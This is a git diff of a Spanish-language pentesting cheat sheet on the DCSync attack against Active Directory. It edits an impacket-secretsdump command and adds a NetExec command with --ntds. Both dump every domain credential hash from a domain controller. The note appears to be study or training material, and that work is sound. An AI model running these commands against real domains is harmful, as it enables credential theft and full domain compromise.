@@ -8,10 +8,13 @@ Si tenemos estos permisos sobre el **Domain**, podemos obtener los permisos nece
 
 ```bash 
 # Se necesitan las dos ACLs para efectuar el DCSync 
-❯ impacket-secretsdump domain.corp/user:'passwd'@IP_DC -just-dc
+❯ impacket-secretsdump domain.corp/user:'P@$$w0rd123!'@IP_DC -just-dc
 
 	# user = Usuario con los privilegios de DCSync
 	# passwd = Contraseña del usuario con los privilegios 
+
+# De otra forma 
+❯ nxc smb -u user -p 'P@$$w0rd123!' --ntds 
 ```
 
 ```bash
